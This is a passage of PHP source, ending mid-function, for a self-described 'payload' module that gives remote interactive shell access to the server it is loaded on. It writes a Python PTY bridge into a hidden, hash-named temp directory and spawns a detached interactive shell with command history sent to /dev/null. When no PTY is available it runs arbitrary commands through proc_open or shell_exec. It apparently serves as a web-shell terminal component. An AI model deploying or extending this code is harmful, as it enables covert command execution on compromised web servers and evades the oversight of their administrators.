<?php
// Standalone PHP 5.6+ artifact: closures keep dependencies local to this payload.
// State storage and host capabilities.
$get = static function ($value, $key, $default = null) {
    return is_array($value) && array_key_exists($key, $value) ? $value[$key] : $default;
};
$available = static function ($name) {
    return function_exists($name) && !in_array($name,
        array_map('trim', explode(',', (string)ini_get('disable_functions'))), true);
};
$phpBinary = defined('PHP_BINARY') ? (string)constant('PHP_BINARY') : '';
$instanceId = substr(hash('sha256', php_uname('n') . '|' . __FILE__ . '|' . $phpBinary), 0, 16);
$baseDirectory = rtrim((string)sys_get_temp_dir(), DIRECTORY_SEPARATOR)
    . DIRECTORY_SEPARATOR . '.' . substr(hash('sha256', __FILE__ . '|state'), 0, 14);
$fileSuffixes = [];
foreach (['state', 'output', 'input', 'size', 'bridge', 'exit', 'lock', 'control'] as $fileLabel) {
    $fileSuffixes[$fileLabel] = '.' . substr(hash('sha256', __FILE__ . '|file|' . $fileLabel), 0, 12);
}
$pathsForKey = static function ($key) use ($baseDirectory, $fileSuffixes) {
    $prefix = $baseDirectory . DIRECTORY_SEPARATOR . $key;
    return [
        'state' => $prefix . $fileSuffixes['state'],
        'output' => $prefix . $fileSuffixes['output'],
        'input' => $prefix . $fileSuffixes['input'],
        'size' => $prefix . $fileSuffixes['size'],
        'bridge' => $prefix . $fileSuffixes['bridge'],
        'exit' => $prefix . $fileSuffixes['exit'],
        'lock' => $prefix . $fileSuffixes['lock'],
        'control' => $prefix . $fileSuffixes['control']
    ];
};
$loadState = static function ($path) {
    if (!is_file($path)) return null;
    $decoded = json_decode((string)@file_get_contents($path), true);
    return is_array($decoded) ? $decoded : null;
};
$saveState = static function ($path, $state) {
    $encoded = json_encode($state);
    $temporary = $path . '.' . getmypid() . '.tmp';
    if (!is_string($encoded) || @file_put_contents($temporary, $encoded, LOCK_EX) === false) {
        throw new RuntimeException('failed to persist terminal state');
    }
    @chmod($temporary, 0600);
    if (!@rename($temporary, $path)) { @unlink($temporary); throw new RuntimeException('failed to persist terminal state'); }
};
$capture = static function ($command) use ($available) {
    if ($available('shell_exec')) return trim((string)@shell_exec($command . ' 2>/dev/null'));
    if ($available('exec')) {
        $lines = []; $code = 0;
        @exec($command . ' 2>/dev/null', $lines, $code);
        return $code === 0 ? trim(implode("\n", $lines)) : '';
    }
    return '';
};
$findCommand = static function ($name) use ($capture) {
    if (!preg_match('/^[A-Za-z0-9._-]+$/', $name)) return null;
    foreach (['/usr/bin/', '/bin/', '/usr/local/bin/', '/usr/sbin/', '/sbin/'] as $directory) {
        $candidate = $directory . $name;
        if (is_file($candidate) && is_executable($candidate)) return $candidate;
    }
    $resolved = $capture('command -v ' . $name);
    if ($resolved !== '' && strpos($resolved, "\n") === false && is_executable($resolved)) return $resolved;
    return null;
};
$isAlive = static function ($pid) use ($available) {
    $pid = (int)$pid;
    if ($pid <= 0) return false;
    if ($available('posix_kill')) return @posix_kill($pid, 0);
    if (DIRECTORY_SEPARATOR !== '\\' && $available('exec')) {
        $lines = []; $code = 1;
        @exec('/bin/kill -0 ' . $pid . ' 2>/dev/null', $lines, $code);
        return $code === 0;
    }
    return false;
};
$signalProcess = static function ($pid, $signal, $processGroup) use ($available) {
    $pid = (int)$pid; $signal = (int)$signal;
    if ($pid <= 0 || DIRECTORY_SEPARATOR === '\\') return;
    $target = $processGroup ? -$pid : $pid;
    if ($available('posix_kill')) {
        @posix_kill($target, $signal);
        return;
    }
    if ($available('exec')) @exec('/bin/kill -' . $signal . ' ' . $target . ' 2>/dev/null');
};
$removeSessionFiles = static function ($paths) {
    foreach (['state', 'output', 'input', 'size', 'bridge', 'exit', 'control'] as $name) @unlink($paths[$name]);
};
$stopPty = static function ($state) use ($isAlive, $signalProcess) {
    if (!is_array($state) || empty($state['pty']) || empty($state['pid'])) return;
    $pid = (int)$state['pid'];
    $processGroup = !empty($state['processGroup']);
    if (!$isAlive($pid)) return;
    $signalProcess($pid, 15, $processGroup);
    $deadline = microtime(true) + 0.75;
    while ($isAlive($pid) && microtime(true) < $deadline) usleep(25000);
    if ($isAlive($pid)) $signalProcess($pid, 9, $processGroup);
};

// Native PTY backend.
$pythonBridge = <<<'PYTHON_BRIDGE'
from __future__ import print_function
import errno, fcntl, os, pty, select, signal, struct, sys, termios, time

input_path, output_path, size_path, exit_path, shell_path, cwd, state_path = sys.argv[1:8]
MAX_OUTPUT = 10 * 1024 * 1024
running = [True]
child_pid = [0]

def forward_signal(signum, frame):
    running[0] = False
    if child_pid[0] > 0:
        try: os.kill(child_pid[0], signum)
        except OSError: pass

for signum in (signal.SIGTERM, signal.SIGHUP, signal.SIGINT):
    signal.signal(signum, forward_signal)

try: os.chdir(cwd)
except OSError: os.chdir(os.path.dirname(output_path))

environment = os.environ.copy()
environment['TERM'] = environment.get('TERM') or 'xterm-256color'
environment['COLORTERM'] = environment.get('COLORTERM') or 'truecolor'
environment['HISTFILE'] = os.devnull
pid, master_fd = pty.fork()
if pid == 0:
    os.execve(shell_path, [shell_path, '-i'], environment)

child_pid[0] = pid
input_fd = os.open(input_path, os.O_RDWR | os.O_NONBLOCK)
output_fd = os.open(output_path, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
flags = fcntl.fcntl(master_fd, fcntl.F_GETFL)
fcntl.fcntl(master_fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
last_size = [None]
last_access = time.time()

def write_all(fd, data):
    while data and running[0]:
        try:
            written = os.write(fd, data)
            if written <= 0: return
            data = data[written:]
        except OSError as error:
            if error.errno in (errno.EINTR, errno.EAGAIN):
                time.sleep(0.01)
                continue
            raise

def apply_size():
    try:
        stream = open(size_path, 'rb'); raw = stream.read(64); stream.close()
        if raw == last_size[0]: return
        last_size[0] = raw
        if not isinstance(raw, str): raw = raw.decode('ascii', 'ignore')
        cols, rows = [int(value) for value in raw.strip().split(',')]
        cols = max(20, min(500, cols)); rows = max(5, min(200, rows))
        fcntl.ioctl(master_fd, termios.TIOCSWINSZ, struct.pack('HHHH', rows, cols, 0, 0))
        try: os.kill(pid, signal.SIGWINCH)
        except OSError: pass
    except (IOError, OSError, ValueError):
        pass

def append_output(data):
    fcntl.flock(output_fd, fcntl.LOCK_EX)
    try:
        if os.fstat(output_fd).st_size > MAX_OUTPUT:
            os.ftruncate(output_fd, 0)
            write_all(output_fd, b'\r\n[terminal output rotated]\r\n')
        write_all(output_fd, data)
    finally:
        fcntl.flock(output_fd, fcntl.LOCK_UN)

exit_code = 0
pending_input = b''
try:
    apply_size()
    while running[0]:
        try: last_access = os.path.getmtime(state_path)
        except OSError: pass
        if time.time() - last_access > 1800: break
        apply_size()
        ready, writable, _ = select.select(
            [master_fd] + ([] if pending_input else [input_fd]),
            [master_fd] if pending_input else [], [], 0.20)
        if master_fd in ready:
            try:
                data = os.read(master_fd, 65536)
                if not data: break
                append_output(data)
            except OSError as error:
                if error.errno not in (errno.EIO, errno.EAGAIN, errno.EINTR): raise
                if error.errno == errno.EIO: break
        if input_fd in ready:
            try:
                pending_input = os.read(input_fd, 65536)
            except OSError as error:
                if error.errno not in (errno.EAGAIN, errno.EINTR): raise
        if master_fd in writable:
            try: pending_input = pending_input[os.write(master_fd, pending_input):]
            except OSError as error:
                if error.errno == errno.EIO: break
                if error.errno not in (errno.EAGAIN, errno.EINTR): raise
        # Keep draining until the PTY reports EOF, including the child's tail output.
finally:
    try: os.close(master_fd)
    except OSError: pass
    if child_pid[0] > 0:
        try: os.kill(child_pid[0], signal.SIGTERM)
        except OSError: pass
        try:
            deadline = time.time() + 0.5
            waited, status = os.waitpid(child_pid[0], os.WNOHANG)
            while waited == 0 and time.time() < deadline:
                time.sleep(0.01)
                waited, status = os.waitpid(child_pid[0], os.WNOHANG)
            if waited == 0:
                try: os.kill(child_pid[0], signal.SIGKILL)
                except OSError: pass
                waited, status = os.waitpid(child_pid[0], 0)
            exit_code = os.WEXITSTATUS(status) if os.WIFEXITED(status) else 128
        except OSError: pass
    for descriptor in (master_fd, input_fd, output_fd):
        try: os.close(descriptor)
        except OSError: pass
    try:
        with open(exit_path, 'w') as stream:
            stream.write(str(exit_code))
    except IOError: pass
PYTHON_BRIDGE;

$createFifo = static function ($path) use ($available, $findCommand) {
    @unlink($path);
    if ($available('posix_mkfifo') && @posix_mkfifo($path, 0600)) return true;
    $mkfifo = $findCommand('mkfifo');
    if ($mkfifo === null) return false;
    if ($available('exec')) {
        $lines = []; $code = 1;
        @exec(escapeshellarg($mkfifo) . ' ' . escapeshellarg($path), $lines, $code);
        return $code === 0 && file_exists($path);
    }
    return false;
};
$selectShell = static function () {
    $configured = getenv('SHELL');
    if ($configured !== false && strpos($configured, "\0") === false
        && is_file($configured) && is_executable($configured)) return $configured;
    foreach (['/bin/bash', '/bin/zsh', '/bin/ksh', '/bin/sh'] as $candidate) {
        if (is_file($candidate) && is_executable($candidate)) return $candidate;
    }
    return null;
};
$launchDetached = static function ($runner) use ($capture, $findCommand) {
    $setsid = $findCommand('setsid');
    $nohup = $findCommand('nohup');
    $command = ($nohup === null ? '' : escapeshellarg($nohup) . ' ')
        . ($setsid === null ? '' : escapeshellarg($setsid) . ' ')
        . $runner . ' </dev/null >/dev/null 2>&1 & echo $!';
    $pidText = $capture('/bin/sh -c ' . escapeshellarg($command));
    $lines = preg_split('/\s+/', trim($pidText));
    $pid = (int)end($lines);
    return ['pid' => $pid, 'processGroup' => $setsid !== null];
};
$startPty = static function ($paths, $cols, $rows) use (
    $pythonBridge, $createFifo, $selectShell, $findCommand, $launchDetached, $isAlive, $stopPty
) {
    if (DIRECTORY_SEPARATOR === '\\') return null;
    $shell = $selectShell();
    if ($shell === null || !$createFifo($paths['input'])) return null;
    @file_put_contents($paths['output'], '', LOCK_EX);
    @file_put_contents($paths['size'], $cols . ',' . $rows, LOCK_EX);
    @unlink($paths['exit']);

    $python = $findCommand('python3');
    if ($python === null) $python = $findCommand('python');
    if ($python === null || @file_put_contents($paths['bridge'], $pythonBridge, LOCK_EX) === false) return null;
    @chmod($paths['bridge'], 0700);
    $runner = escapeshellarg($python) . ' ' . escapeshellarg($paths['bridge'])
        . ' ' . escapeshellarg($paths['input']) . ' ' . escapeshellarg($paths['output'])
        . ' ' . escapeshellarg($paths['size']) . ' ' . escapeshellarg($paths['exit'])
        . ' ' . escapeshellarg($shell) . ' ' . escapeshellarg(getcwd() ?: sys_get_temp_dir())
        . ' ' . escapeshellarg($paths['state']);
    $backend = basename($python) . '-pty';
    $started = $launchDetached($runner);
    usleep(300000);
    if ($isAlive($started['pid'])) return [
        'backend' => $backend, 'pty' => true, 'resizable' => true, 'backendFailures' => [],
        'pid' => $started['pid'], 'processGroup' => $started['processGroup'],
        'active' => true
    ];
    $stopPty(['pty' => true, 'pid' => $started['pid'], 'processGroup' => $started['processGroup']]);
    return ['startupFailed' => true, 'backendFailures' => [$backend]];
};
$writePty = static function ($path, $data) {
    if ($data === '') return 0;
    $stream = @fopen($path, 'r+');
    if ($stream === false) throw new RuntimeException('terminal input channel is unavailable');
    try {
        if (!stream_set_blocking($stream, false)) throw new RuntimeException('failed to configure terminal input');
        $length = strlen($data); $offset = 0;
        $deadline = microtime(true) + 1;
        while ($offset < $length) {
            if (microtime(true) >= $deadline) {
                throw new RuntimeException('terminal input timed out after ' . $offset . ' bytes; close the terminal if the process is unresponsive');
            }
            $read = null; $write = [$stream]; $except = null;
            $ready = @stream_select($read, $write, $except, 0, 50000);
            if ($ready === false) throw new RuntimeException('terminal input channel is unavailable');
            if ($ready === 0) continue;
            $written = @fwrite($stream, substr($data, $offset, 8192));
            if ($written === false) throw new RuntimeException('failed to write terminal input');
            $offset += $written;
        }
        return $offset;
    } finally {
        fclose($stream);
    }
};

// Command fallback: line editing, streaming output and bounded execution.
$newCommandState = static function ($backendFailures = []) {
    $cwd = getcwd();
    if ($cwd === false || !is_dir($cwd)) $cwd = sys_get_temp_dir();
    return [
        'backend' => DIRECTORY_SEPARATOR === '\\' ? 'windows-command' : 'unix-command',
        'pty' => false, 'resizable' => false,
        'backendFailures' => is_array($backendFailures) ? $backendFailures : [],
        'cwd' => $cwd, 'previousCwd' => '', 'buffer' => '', 'escape' => false,
        'skipLf' => false, 'active' => true, 'running' => false
    ];
};
$appendOutput = static function ($path, $data) {
    if ($data === '') return;
    $stream = @fopen($path, 'c+b');
    if ($stream === false) throw new RuntimeException('failed to open terminal output');
    try {
        if (!flock($stream, LOCK_EX)) throw new RuntimeException('failed to lock terminal output');
        $stat = fstat($stream);
        if ($stat['size'] > 10485760) {
            fseek($stream, -5242880, SEEK_END);
            $tail = (string)stream_get_contents($stream);
            ftruncate($stream, 0); rewind($stream); fwrite($stream, $tail);
        }
        fseek($stream, 0, SEEK_END);
        if (fwrite($stream, $data) !== strlen($data)) throw new RuntimeException('failed to persist terminal output');
        fflush($stream);
    } finally {
        flock($stream, LOCK_UN); fclose($stream);
    }
};
$readOutput = static function ($path, $limit = 1048576, $nonBlocking = false) {
    if (!is_file($path)) return '';
    $stream = @fopen($path, 'r+b');
    if ($stream === false) return '';
    try {
        if (!flock($stream, LOCK_EX | ($nonBlocking ? LOCK_NB : 0))) {
            throw new RuntimeException('terminal output is busy');
        }
        $chunk = (string)fread($stream, $limit);
        $tail = (string)stream_get_contents($stream);
        ftruncate($stream, 0); rewind($stream);
        if ($tail !== '') fwrite($stream, $tail);
        fflush($stream);
        return $chunk;
    } finally {
        flock($stream, LOCK_UN); fclose($stream);
    }
};
$prompt = static function ($state) {
    $user = getenv(DIRECTORY_SEPARATOR === '\\' ? 'USERNAME' : 'USER');
    if ($user === false || $user === '') $user = 'php';
    $host = function_exists('gethostname') ? gethostname() : php_uname('n');
    if ($host === false || $host === '') $host = 'host';
    return "\033[32m" . $user . '@' . $host . "\033[0m:\033[34m" . $state['cwd'] . "\033[0m"
        . (DIRECTORY_SEPARATOR === '\\' ? '> ' : '$ ');
};
$stripQuotes = static function ($value) {
    $value = trim((string)$value); $length = strlen($value);
    if ($length >= 2 && (($value[0] === '"' && $value[$length - 1] === '"')
        || ($value[0] === "'" && $value[$length - 1] === "'"))) return substr($value, 1, -1);
    return $value;
};
$terminateCommand = static function ($process) use ($available) {
    $status = proc_get_status($process);
    $pid = (int)$status['pid'];
    if (DIRECTORY_SEPARATOR === '\\') {
        $killer = @proc_open('taskkill /PID ' . $pid . ' /T /F',
            [0 => ['file', 'NUL', 'r'], 1 => ['file', 'NUL', 'w'], 2 => ['file', 'NUL', 'w']], $unused);
        if (is_resource($killer)) proc_close($killer);
    } else {
        // Snapshot descendants before killing the root so children cannot be lost
        // through reparenting. proc_open is already required by this backend.
        $probe = @proc_open('ps -eo pid=,ppid=',
            [0 => ['file', '/dev/null', 'r'], 1 => ['pipe', 'w'], 2 => ['file', '/dev/null', 'w']], $pipes);
        $children = [];
        if (is_resource($probe)) {
            $listing = (string)stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($probe);
            foreach (preg_split('/\r?\n/', trim($listing)) as $line) {
                if (preg_match('/^\s*(\d+)\s+(\d+)\s*$/', $line, $match)) {
                    $children[(int)$match[2]][] = (int)$match[1];
                }
            }
        }
        $tree = [$pid];
        for ($i = 0; $i < count($tree); $i++) {
            foreach (isset($children[$tree[$i]]) ? $children[$tree[$i]] : [] as $child) $tree[] = $child;
        }
        foreach (array_reverse($tree) as $target) {
            if ($available('posix_kill')) @posix_kill($target, 9);
            else {
                $killer = @proc_open('/bin/kill -9 ' . $target,
                    [0 => ['file', '/dev/null', 'r'], 1 => ['file', '/dev/null', 'w'], 2 => ['file', '/dev/null', 'w']], $unused);
                if (is_resource($killer)) proc_close($killer);
            }
        }
    }
    @proc_terminate($process, 9);
};
$runCommand = static function ($command, &$state, $paths, $lock, $deadline) use (
    $available, $stripQuotes, $saveState, $loadState, $appendOutput, $terminateCommand
) {
    $command = trim((string)$command);
    if ($command === '') return '';
    if ($command === 'clear' || $command === 'cls') return "\033[2J\033[H";
    if ($command === 'exit' || $command === 'logout') { $state['active'] = false; return "logout\n"; }
    if (preg_match('/^cd(?:\s+(.*))?$/s', $command, $match)) {
        $path = isset($match[1]) ? $stripQuotes($match[1]) : '';
        if ($path === '' || $path === '~') {
            $home = getenv(DIRECTORY_SEPARATOR === '\\' ? 'USERPROFILE' : 'HOME');
            $path = $home !== false ? $home : $state['cwd'];
        } elseif ($path === '-') {
            $path = $state['previousCwd'] !== '' ? $state['previousCwd'] : $state['cwd'];
        } elseif (!preg_match('/^(?:[A-Za-z]:[\\\\\/]|[\\\\\/])/', $path)) {
            $path = rtrim($state['cwd'], '/\\') . DIRECTORY_SEPARATOR . $path;
        }
        $resolved = realpath($path);
        if ($resolved === false || !is_dir($resolved)) return 'cd: no such directory: ' . $path . "\n";
        $state['previousCwd'] = $state['cwd']; $state['cwd'] = $resolved;
        return '';
    }
    if (!$available('proc_open')) throw new RuntimeException('proc_open is required for command fallback');
    if (microtime(true) >= $deadline) {
        $state['cancelBatch'] = true;
        return "[command stopped by terminal limit]\n";
    }
    $shell = DIRECTORY_SEPARATOR === '\\'
        ? 'cmd.exe /d /s /c ' . $command
        : '/bin/sh -c ' . escapeshellarg($command);
    $pipes = [];
    $process = proc_open($shell, [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['redirect', 1]],
        $pipes, $state['cwd']);
    if (!is_resource($process)) throw new RuntimeException('proc_open failed');
    fclose($pipes[0]); stream_set_blocking($pipes[1], false);
    $state['running'] = true;
    try {
        $saveState($paths['state'], $state);
    } catch (Exception $error) {
        $terminateCommand($process); fclose($pipes[1]); proc_close($process);
        $state['running'] = false;
        throw $error;
    }
    @unlink($paths['control']);
    flock($lock, LOCK_UN);
    $bytes = 0; $cancelled = false;
    try {
        while (true) {
            $chunk = (string)stream_get_contents($pipes[1], max(1, 1048576 - $bytes));
            if ($chunk !== '') { $bytes += strlen($chunk); $appendOutput($paths['output'], $chunk); }
            clearstatcache(true, $paths['control']);
            $control = is_file($paths['control']) ? trim((string)@file_get_contents($paths['control'])) : '';
            if ($control !== '' || microtime(true) >= $deadline || $bytes >= 1048576) {
                $cancelled = true;
                $terminateCommand($process);
                if ($control === 'interrupt') $appendOutput($paths['output'], "^C\r\n");
                elseif ($control !== 'stop') $appendOutput($paths['output'], "\r\n[command stopped by terminal limit]\r\n");
                break;
            }
            $status = proc_get_status($process);
            if (!$status['running']) break;
            usleep(10000);
        }
        if (!$cancelled) {
            $tail = (string)stream_get_contents($pipes[1], max(1, 1048576 - $bytes));
            if ($tail !== '') $appendOutput($paths['output'], $tail);
        }
    } finally {
        if (proc_get_status($process)['running']) $terminateCommand($process);
        fclose($pipes[1]); proc_close($process);
        flock($lock, LOCK_EX);
        $latest = $loadState($paths['state']);
        if (is_array($latest)) $state = $latest;
        $state['running'] = false;
        $state['cancelBatch'] = $cancelled;
        @unlink($paths['control']);
    }
    return '';
};
$writeCommand = static function (&$state, $command, $paths, $lock) use ($appendOutput, $prompt, $runCommand) {
    $outputPath = $paths['output'];
    $deadline = microtime(true) + 20;
    $length = strlen($command);
    for ($index = 0; $index < $length; $index++) {
        if (empty($state['active']) || !empty($state['cancelBatch'])) break;
        $character = $command[$index]; $code = ord($character);
        if (!empty($state['escape'])) {
            if ($state['escape'] === 'start' && ($character === '[' || $character === 'O')) {
                $state['escape'] = 'sequence';
            } elseif ($code >= 64 && $code <= 126) $state['escape'] = false;
            continue;
        }
        if ($code === 27) { $state['escape'] = 'start'; continue; }
        if (!empty($state['skipLf'])) { $state['skipLf'] = false; if ($character === "\n") continue; }
        if ($character === "\r" || $character === "\n") {
            $appendOutput($outputPath, "\r\n");
            $pending = $state['buffer']; $state['buffer'] = '';
            try {
                $result = $runCommand($pending, $state, $paths, $lock, $deadline);
                if ($result !== '') $appendOutput($outputPath, str_replace("\n", "\r\n", $result));
            } catch (Exception $error) {
                $appendOutput($outputPath, "\033[31m" . $error->getMessage() . "\033[0m\r\n");
            }
            $state['buffer'] = ''; if ($character === "\r") $state['skipLf'] = true;
            if (!empty($state['active'])) $appendOutput($outputPath, $prompt($state));
        } elseif ($code === 3) {
            $state['buffer'] = ''; $appendOutput($outputPath, "^C\r\n" . $prompt($state));
        } elseif ($code === 8 || $code === 127) {
            if ($state['buffer'] !== '') {
                // Delete a complete UTF-8 character, including its continuation bytes.
                $end = strlen($state['buffer']) - 1;
                while ($end > 0 && (ord($state['buffer'][$end]) & 0xc0) === 0x80) $end--;
                $state['buffer'] = substr($state['buffer'], 0, $end);
                $appendOutput($outputPath, "\b \b");
            }
        } elseif ($code >= 32 || $character === "\t") {
            $state['buffer'] .= $character; $appendOutput($outputPath, $character);
        }
    }
    unset($state['cancelBatch']);
    return $length;
};
// Opportunistic state-file cleanup; live PTYs also enforce their own idle timeout.
$cleanup = static function ($excludeKey) use (
    $baseDirectory, $fileSuffixes, $loadState, $pathsForKey, $stopPty, $removeSessionFiles
) {
    $stateSuffix = $fileSuffixes['state'];
    $states = (array)glob($baseDirectory . DIRECTORY_SEPARATOR . '*' . $stateSuffix);
    usort($states, static function ($left, $right) { return @filemtime($left) - @filemtime($right); });
    $removeCount = max(0, count($states) - 32);
    foreach ($states as $index => $statePath) {
        $name = basename($statePath); $key = substr($name, 0, strlen($name) - strlen($stateSuffix));
        if ($key === $excludeKey) continue;
        if ($index >= $removeCount && @filemtime($statePath) >= time() - 1800) continue;
        $paths = $pathsForKey($key);
        $lock = @fopen($paths['lock'], 'c+');
        if ($lock === false || !@flock($lock, LOCK_EX | LOCK_NB)) { if ($lock !== false) fclose($lock); continue; }
        $removed = false;
        try {
            $state = $loadState($statePath);
            // A command releases this lock while running. Its owning request
            // still needs the state and output files to finish or be interrupted.
            if (is_array($state) && !empty($state['running'])) continue;
            $stopPty($state);
            $removeSessionFiles($paths);
            $removed = true;
        } finally {
            flock($lock, LOCK_UN);
            fclose($lock);
            if ($removed) @unlink($paths['lock']);
        }
    }
};

// Response construction is shared by all operations; process liveness is not EOF.
$terminalResponse = static function ($state, $fields = []) use ($instanceId) {
    return array_merge([
        'code' => 200, 'instanceId' => $instanceId, 'longPolling' => false, 'batchRead' => true,
        'alive' => is_array($state) && !empty($state['active']),
        'pty' => is_array($state) && !empty($state['pty']),
        'resizable' => is_array($state) && !empty($state['resizable']),
        'backend' => is_array($state) ? $state['backend'] : 'missing',
        'backendFailures' => isset($state['backendFailures']) ? $state['backendFailures'] : []
    ], $fields);
};
$signalCommand = static function ($paths, $signal) {
    if (@file_put_contents($paths['control'], $signal, LOCK_EX) === false) {
        throw new RuntimeException('failed to signal terminal command');
    }
};
$initializeSession = static function ($state, $paths) use (
    $removeSessionFiles, $startPty, $newCommandState, $appendOutput, $prompt, $saveState
) {
    // Repeated initialization preserves the process, buffered output and sequence.
    if (is_array($state)) return $state;
    $removeSessionFiles($paths);
    $state = $startPty($paths, 80, 24);
    if (!is_array($state) || !empty($state['startupFailed'])) {
        $failures = isset($state['backendFailures']) ? $state['backendFailures'] : [];
        $state = $newCommandState($failures);
        if (@file_put_contents($paths['output'], '', LOCK_EX) === false) {
            throw new RuntimeException('failed to initialize terminal output');
        }
        $appendOutput($paths['output'], "PHP command terminal ready\r\n" . $prompt($state));
    }
    $saveState($paths['state'], $state);
    return $state;
};
$readSession = static function ($state, $paths, $limit = 1048576, $nonBlocking = false) use (
    $readOutput, $isAlive, $saveState, $terminalResponse
) {
    if (!is_array($state)) return $terminalResponse(null, [
        'data' => leo_binary(''), 'missing' => true, 'eof' => true
    ]);
    // Check producer liveness before consuming output. Once false, no bytes can
    // arrive between the final read and the EOF decision.
    $state['active'] = !empty($state['pty']) ? $isAlive($state['pid']) : !empty($state['active']);
    $data = $readOutput($paths['output'], $limit, $nonBlocking);
    $state['outputSequence'] = (isset($state['outputSequence']) ? $state['outputSequence'] : 0) + 1;
    $saveState($paths['state'], $state);
    clearstatcache(true, $paths['output']);
    $remaining = is_file($paths['output']) ? (int)filesize($paths['output']) : 0;
    $hasMore = $remaining > 0;
    $exitCode = is_file($paths['exit']) ? (int)trim((string)@file_get_contents($paths['exit'])) : null;
    return $terminalResponse($state, [
        'data' => leo_binary($data), 'exitCode' => $exitCode, 'outputSequence' => $state['outputSequence'],
        'busy' => !empty($state['running']), 'hasMore' => $hasMore,
        'eof' => empty($state['active']) && empty($state['running']) && !$hasMore
    ]);
};
$stopSession = static function ($state, $paths, &$removeLock) use (
    $saveState, $signalCommand, $stopPty, $removeSessionFiles, $terminalResponse
) {
    if (is_array($state) && !empty($state['running'])) {
        $state['active'] = false;
        $state['stopped'] = true;
        $saveState($paths['state'], $state);
        $signalCommand($paths, 'stop');
    } else {
        $stopPty($state);
        $removeSessionFiles($paths);
        $removeLock = true;
    }
    return $terminalResponse($state, ['stopped' => true, 'alive' => false]);
};
$resizeSession = static function ($state, $paths, $command) use ($saveState, $terminalResponse) {
    if (!is_array($state)) throw new RuntimeException('terminal session is not initialized');
    if (!preg_match('/^(\d{1,3}),(\d{1,3})$/', trim($command), $match)) {
        throw new InvalidArgumentException('resize expects cols,rows');
    }
    $cols = max(20, min(500, (int)$match[1]));
    $rows = max(5, min(200, (int)$match[2]));
    $resizable = !empty($state['resizable']);
    if ($resizable && @file_put_contents($paths['size'], $cols . ',' . $rows, LOCK_EX) === false) {
        throw new RuntimeException('failed to resize terminal');
    }
    $saveState($paths['state'], $state);
    return $terminalResponse($state, ['cols' => $cols, 'rows' => $rows, 'resized' => $resizable]);
};
$writeSession = static function ($state, $paths, $command, $lock, &$removeLock) use (
    $signalCommand, $terminalResponse, $writePty, $isAlive,
    $writeCommand, $saveState, $removeSessionFiles
) {
    if (!is_array($state)) throw new RuntimeException('terminal session is not initialized');
    if (!empty($state['running'])) {
        if ($command !== "\x03") return ['code' => 409, 'msg' => 'terminal command is still running'];
        $signalCommand($paths, 'interrupt');
        return $terminalResponse($state, ['written' => 1]);
    }
    if (empty($state['active'])) throw new RuntimeException('terminal process has exited');
    if (!empty($state['pty'])) {
        if (!$isAlive($state['pid'])) throw new RuntimeException('terminal process has exited');
        $written = $writePty($paths['input'], $command);
    } else {
        // May temporarily release the session lock to service read/control requests.
        $written = $writeCommand($state, $command, $paths, $lock);
    }
    if (!empty($state['stopped'])) {
        $removeSessionFiles($paths);
        $removeLock = true;
    } else {
        $saveState($paths['state'], $state);
    }
    return $terminalResponse($state, ['written' => $written]);
};

// Single and batch reads share validation and per-session locking.
$validateProcessId = static function ($value) {
    if (!is_string($value)) throw new InvalidArgumentException('invalid processId');
    $processId = trim($value);
    if ($processId === '' || strlen($processId) > 128 || !preg_match('/^[A-Za-z0-9._-]+$/', $processId)) {
        throw new InvalidArgumentException('invalid processId');
    }
    return $processId;
};
$handleSession = static function ($action, $params, $limit = 1048576, $nonBlocking = false) use (
    $validateProcessId,
    $get, $baseDirectory, $pathsForKey, $cleanup, $loadState,
    $readSession, $stopSession, $resizeSession, $writeSession, $initializeSession, $terminalResponse
) {
    if (!in_array($action, ['init', 'read', 'write', 'resize', 'stop'], true)) {
        throw new InvalidArgumentException('unsupported terminal action');
    }
    $includeOutput = $get($params, 'includeOutput', false);
    if (!is_bool($includeOutput) || ($includeOutput && $action !== 'init' && $action !== 'write')) {
        throw new InvalidArgumentException('includeOutput must be a boolean and is only accepted on init/write');
    }
    $command = $get($params, 'cmd', '');
    if (!is_string($command)) throw new InvalidArgumentException('cmd must be a string');
    if ($action === 'write' || $action === 'resize') {
        if ($command === '' || strlen($command) > 1048576) {
            throw new InvalidArgumentException('cmd must contain 1 to 1048576 bytes');
        }
    } elseif ($command !== '') {
        throw new InvalidArgumentException('cmd is only accepted on write/resize');
    }
    if (array_key_exists('terminalMode', $params) || array_key_exists('waitMs', $params)) {
        throw new InvalidArgumentException('PHP terminal does not accept terminalMode or long polling');
    }
    $processId = $validateProcessId($get($params, 'processId', ''));
    if (!is_dir($baseDirectory) && !@mkdir($baseDirectory, 0700, true) && !is_dir($baseDirectory)) {
        throw new RuntimeException('failed to create terminal state directory');
    }
    $key = hash('sha256', $processId);
    $cleanup($key);
    $paths = $pathsForKey($key);
    $lock = @fopen($paths['lock'], 'c+');
    if ($lock === false) throw new RuntimeException('failed to open terminal lock');
    $removeLock = false;
    try {
        if (!flock($lock, LOCK_EX | ($nonBlocking ? LOCK_NB : 0))) {
            throw new RuntimeException('terminal state is busy');
        }
        $state = $loadState($paths['state']);
        if ($action === 'read') return $readSession($state, $paths, $limit, $nonBlocking);
        if ($action === 'stop') return $stopSession($state, $paths, $removeLock);
        if ($action === 'resize') return $resizeSession($state, $paths, $command);
        $result = $action === 'init'
            ? $terminalResponse($initializeSession($state, $paths), ['initialized' => true])
            : $writeSession($state, $paths, $command, $lock, $removeLock);
        if ($includeOutput && $result['code'] === 200) {
            try {
                // Command execution may have released the lock; reload the latest sequence and state.
                $result['output'] = $readSession($loadState($paths['state']), $paths, 65536, true);
            } catch (Exception $error) {
                $result['output'] = ['code' => 500, 'msg' => $error->getMessage()];
            }
        }
        return $result;
    } finally {
        flock($lock, LOCK_UN);
        fclose($lock);
        if ($removeLock) @unlink($paths['lock']);
    }
};

return [
    'id' => 'ExecCommandComponent',
    'version' => '3.0.0',
    'handle' => static function ($action, $params) use ($get, $validateProcessId, $handleSession, $instanceId) {
        if ($action !== 'read-batch') return $handleSession($action, $params);
        $values = $get($params, 'processIds', []);
        if (!is_array($values) || count($values) < 1 || count($values) > 16) {
            throw new InvalidArgumentException('batch requires 1 to 16 processIds');
        }
        $ids = [];
        // Reject invalid or duplicate identifiers before consuming any output.
        foreach ($values as $value) {
            $id = $validateProcessId($value);
            if (isset($ids[$id])) throw new InvalidArgumentException('duplicate processId');
            $ids[$id] = true;
        }
        $terminals = [];
        foreach ($ids as $id => $unused) {
            try {
